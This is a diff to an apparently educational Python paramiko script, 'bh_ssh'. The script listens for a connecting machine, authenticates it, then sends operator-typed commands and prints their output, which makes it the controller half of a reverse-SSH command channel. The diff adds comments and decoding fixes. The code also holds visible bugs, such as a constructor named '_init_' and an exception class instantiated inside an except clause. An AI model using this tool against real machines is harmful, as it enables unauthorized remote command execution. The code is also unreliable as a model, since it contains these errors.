@@ -2,10 +2,10 @@ import socket
 import paramiko
 import threading
 import sys
+import os
 
 # using the key from paramiko demo files
-
-host_key = paramiko.RSAKey(filename='keys/rsa_sha256.pub') # location of RSA public key
+host_key = paramiko.RSAKey(filename=os.path.join('/home', 'sjbavier','Reference', 'python', 'haX', 'keys', 'rsa_sha256')) # location of RSA public key
 
 class Server (paramiko.ServerInterface):
     def _init_(self):
@@ -38,31 +38,45 @@ try:
     # listen for a connection with a backlog of 100
     sock.listen(100)
     print('[+] Listening for connection... ')
+
+    # wait for a new connection and return socket
     client, addr = sock.accept()
+
 except Exception as e:
     print('[-] Listen failed: ' + str(e))
     sys.exit(1)
 
 print('[+] Got a connection!')
 
+# once the connection is established create channel and command loop
 try:
+    # transport attaches to the socket
+    # creates stream tunnels called channels
     bhSession = paramiko.Transport(client)
+
+    # add host key
     bhSession.add_server_key(host_key)
+    
+    # create server
     server = Server()
+
     try:
+        # start new SSH2 session server
         bhSession.start_server(server=server)
     except paramiko.SSHException() as x:
         print('[-] SSH negotiation failed.')
+    # return a new channel will wait for 20 sec    
     chan = bhSession.accept(20)
     print('[+] Authenticated!')
-    print(chan.recv(1024))
+    print(chan)
+    print(chan.recv(1024).decode('utf-8'))
     chan.send('Welcome to bh_ssh')
     while True:
         try:
             command = input("Enter command: ").strip('\n')
             if command != 'exit':
                 chan.send(command)
-                print(chan.recv(1024) + '\n')
+                print(chan.recv(1024).decode('utf-8') + '\n')
             else:
                 chan.send('exit')
                 print('exit')
@@ -70,7 +84,7 @@ try:
                 raise Exception ('exit')
         except KeyboardInterrupt:
             bhSession.close()
-except Exception(e):
+except Exception as e:
     print('[-] Caught exception: ' + str(e))
     try:
         bhSession.close()
